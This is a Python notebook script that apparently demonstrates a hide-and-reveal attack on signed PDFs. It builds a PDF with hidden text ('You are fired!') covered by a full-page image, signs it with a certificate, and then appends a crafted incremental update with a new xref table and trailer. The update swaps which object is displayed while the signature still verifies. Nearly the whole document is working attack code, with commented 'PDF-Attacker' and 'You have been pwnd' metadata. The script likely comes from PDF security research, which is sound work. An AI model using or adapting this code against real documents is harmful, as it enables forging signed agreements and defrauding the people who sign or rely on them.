# To add a new cell, type '# %%'
# To add a new markdown cell, type '# %% [markdown]'
# %% [markdown]
# # Configuration Parameters

# %%
filename_visible  = "pdf/visible.pdf"
filename_unsigned = "pdf/attack/hidden/unsigned.pdf"
filename_signed   = filename_unsigned.replace(".pdf", "-signed.pdf")
filename_manipulated   = filename_signed.replace(".pdf", "-manipulated.pdf")


# %%
from fpdf import FPDF
from wand.image import Image, Color

class PDF(FPDF):

    def _putcatalog(self):
         super()._putcatalog()
         self._out('/Metadata {:d} 0 R'.format(self.objectid_metadata))

    def _puttrailer(self):
        self._out('/Size '+str(self.n+1))
        self._out('/Root '+str(self.n)+' 0 R')
        self._out('/Info '+str(self.objectid_info)+' 0 R')

    def _putinfoobj(self):
        self._newobj()
        self.objectid_info = self.n
        self._out('<<')
        self._putinfo()
        self._out('>>')
        self._out('endobj')

    def xmpmeta(self):
        xml = """stream
<?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.4-c006 80.159825, 2016/09/16-03:31:08        ">
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""
            xmlns:xmp="http://ns.adobe.com/xap/1.0/"
            xmlns:dc="http://purl.org/dc/elements/1.1/"
            xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
         <xmp:ModifyDate>2019-08-07T13:48:36+02:00</xmp:ModifyDate>
         <xmp:MetadataDate>2019-08-07T13:48:36+02:00</xmp:MetadataDate>
         <xmp:CreateDate>2019-08-07T11:14:22+02:00</xmp:CreateDate>
         <dc:format>application/pdf</dc:format>
         <xmpMM:DocumentID>uuid:d24ecc88-2a52-0b43-9272-3abe5e065c85</xmpMM:DocumentID>
         <xmpMM:InstanceID>uuid:9d3cd24f-99fe-0849-a303-c9cfac889c31</xmpMM:InstanceID>
      </rdf:Description>
   </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream"""
        head = "<< /Subtype /XML /Type /Metadata /Length {:d} >>".format(len(xml))
        self._newobj()
        self.objectid_metadata = self.n
        self._out(head)
        self._out(xml)
        self._out('endobj')

    def _enddoc(self):
        self._putheader()
        self._putpages()
        self._putinfoobj()
        self.xmpmeta()
        self._putresources()
        #Info
        #self._putinfo
        #Catalog
        self._newobj()
        self._out('<<')
        self._putcatalog()
        self._out('>>')
        self._out('endobj')
        #Cross-ref
        o=len(self.buffer)
        self._out('xref')
        self._out('0 '+(str(self.n+1)))
        self._out('0000000000 65535 f ')
        for i in range(1,self.n+1):
            self._out("{:010d} 00000 n ".format(self.offsets[i]))
        #Trailer
        self._out('trailer')
        self._out('<<')
        self._puttrailer()
        self._out('>>')
        self._out('startxref')
        self._out(o)
        self._out('%%EOF')
        self.state=3

pdf = PDF()
pdf.add_page()
# Setup hidden Content
pdf.set_font('Arial', 'B', 24)
pdf.cell(20, 30, 'You are fired!')
# Setup visible Content
imagename = filename_visible.replace(".pdf", ".png")
def pdf_to_image(pdfname, imagename):
    with Image(filename=pdfname, resolution=300) as img:
        with Image(width=img.width, height=img.height, background=Color("white")) as bg:
            bg.composite(img,0,0)
            bg.save(filename=imagename)

pdf_to_image(pdfname=filename_visible, imagename=imagename)
pdf.image(imagename,0,0,pdf.w) # Fullpage
pdf.set_author("Creator")
pdf.set_title("Sign me")
# Save unsigned PDF
pdf.output(filename_unsigned, 'F')


# %%
import datetime
from cryptography.hazmat import backends
from cryptography.hazmat.primitives.serialization import pkcs12

from endesive.pdf import cms

date = datetime.datetime.utcnow() - datetime.timedelta(hours=12)
date = date.strftime("D:%Y%m%d%H%M%S+00'00'")
dct = {
    "aligned": 0,
    #"sigflags": 3,
    "sigflagsft": 132,
    "sigpage": 0,
    "sigbutton": True,
    "sigfield": "Signature1",
    "sigandcertify": False,
    "signaturebox": (470, 840, 570, 640),
    "signature": "I ultimatively agree",
#        "signature_img": "signature_test.png",
    "contact": "Signer",
    "location": "AoE",
    "signingdate": date,
    "reason": "No reason given",
    "password": "1234",
}
with open("demo2_user1.p12", "rb") as fp:
    p12 = pkcs12.load_key_and_certificates(
        fp.read(), b"1234", backends.default_backend()
    )

data_unsigned = open(filename_unsigned, "rb").read()
data_signature = cms.sign(data_unsigned, dct, p12[0], p12[1], p12[2], "sha256")
with open(filename_signed, "wb") as fp:
    fp.write(data_unsigned)
    fp.write(data_signature)



# %%
from pdfmanipulation import *
data_signed_pdf = data_unsigned + data_signature

start_object = len(data_signed_pdf)
objectid_info = pdf.objectid_info
# info_obj = getObjectByReference(data_unsigned,objectid_info,0)[0][0]
# info_obj = """{:d} 0 obj
# <<
# /Producer (Created by PDF-Attacker)
# /Title (You have been pwnd)
# /Author (Attacker)
# /CreationDate (D:20211111111111)
# >>
# endobj
# """.format(pdf.objectid_info).encode()

objectid_info = pdf.objectid_metadata
objectid_image = 8
info_obj = getObjectByReference(data_unsigned, objectid_info,0)[0][0]
info_obj = "{:d}".format(objectid_image).encode() + info_obj[len("{:d}".format(objectid_info)):] # replace obj number

start_xref = "{:d}".format(start_object + len(info_obj) + 1).encode()
xref = """
xref
0 1 
0000000000 65535 f 
{:d} 1 
{:010d} 00000 n 
{:d} 1 
{:010d} 00000 n 
""".format(
    objectid_info, len(data_signed_pdf),
    objectid_image, len(data_signed_pdf),
    ).encode()

print(xref.decode())

signedTrailer = getTrailer(data_signature)
ref_root = signedTrailer[0].group("root")
ref_info = signedTrailer[0].group("info")
size = signedTrailer[0].group("size")
prev = getStartxref(data_signature)[0].group("value")

trailer = b"""trailer
<<
/Size """+size+b"""
/Root """+ref_root+b"""
/Info """+ref_info+b"""
/Prev """+prev+b"""
>>
startxref
"""+start_xref+b"""
%%EOF
"""

with open(filename_manipulated, "wb") as fp:
    fp.write(data_signed_pdf)
    fp.write(info_obj)
    fp.write(xref)
    fp.write(trailer)

# %%
# tmp = getObjectByType(data_unsigned, "/XObject")
# print(len(tmp))
# print(tmp)

